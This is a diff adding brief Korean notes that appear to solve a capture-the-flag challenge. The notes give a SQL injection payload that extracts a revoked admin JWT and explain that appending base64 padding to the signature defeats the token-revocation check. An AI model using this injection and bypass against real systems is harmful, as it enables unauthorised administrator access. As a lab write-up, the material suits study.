@@ -1,0 +1,10 @@
+' UNION SELECT id, 'haha', true, token FROM revoked_tokens --
+입력 후 admin token 얻기
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc2NDQzNTMxNC43OTQzNzIzfQ.EE7fMHbihNmo57lqVckUpn7r4IynVn-AtYcOBUG5YiI
+이 토큰에서 header.payload.signature인데 각각은 독립적으로 base64 decode되므로
+각 부분 뒤에 =을 붙여도 상관 없다
+그런데 header와 payload는 붙이면 signature랑 달라져서 붙이면 안 되지만
+signature는 붙여도 상관없고
+붙이면 revoked_tokens의 token과는 값이 달라지기 때문에
+admin token으로 해석되게 된다
